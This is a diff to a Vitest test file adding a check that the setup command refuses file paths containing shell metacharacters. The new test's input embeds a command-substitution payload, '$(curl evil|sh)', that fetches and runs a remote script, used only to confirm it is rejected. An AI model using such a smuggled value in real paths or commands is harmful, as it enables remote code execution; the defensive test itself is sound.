@@ -19,10 +19,15 @@ vi.mock('../core/index.js', async () => {
 const { setMachinePathSpy } = vi.hoisted(() => ({
   setMachinePathSpy: vi.fn((_key: string, value = '') => value),
 }));
-vi.mock('../core/local-config.js', () => ({
-  MACHINE_PATH_KEYS: ['issueListPath', 'skippedIssuesPath'],
-  setMachinePath: setMachinePathSpy,
-}));
+vi.mock('../core/local-config.js', async (importOriginal) => {
+  const actual = await importOriginal<typeof import('../core/local-config.js')>();
+  return {
+    MACHINE_PATH_KEYS: ['issueListPath', 'skippedIssuesPath'],
+    // Real check: a path with a shell metacharacter is refused before anything is set (#1934).
+    assertSafeMachinePath: actual.assertSafeMachinePath,
+    setMachinePath: setMachinePathSpy,
+  };
+});
 
 vi.mock('./validation.js', () => ({
   validateGitHubUsername: vi.fn(),
@@ -364,6 +369,14 @@ describe('runSetup', () => {
     expect(setMachinePathSpy).toHaveBeenCalledWith('skippedIssuesPath', '/tmp/skip.txt');
     expect(mockUpdateConfig).not.toHaveBeenCalled();
     expect(result.settings).toMatchObject({ skippedIssuesPath: '/tmp/skip.txt' });
+  });
+
+  it('refuses a path with a shell metacharacter before applying any setting (#1934)', async () => {
+    await expect(runSetup({ set: ['languages=go', 'issueListPath=/tmp/list$(curl evil|sh).md'] })).rejects.toThrow(
+      /a path may not contain/,
+    );
+    expect(mockUpdateConfig).not.toHaveBeenCalled();
+    expect(setMachinePathSpy).not.toHaveBeenCalled();
   });
 
   it('skips the Gist checkpoint when every key set is machine-local (#1950)', async () => {
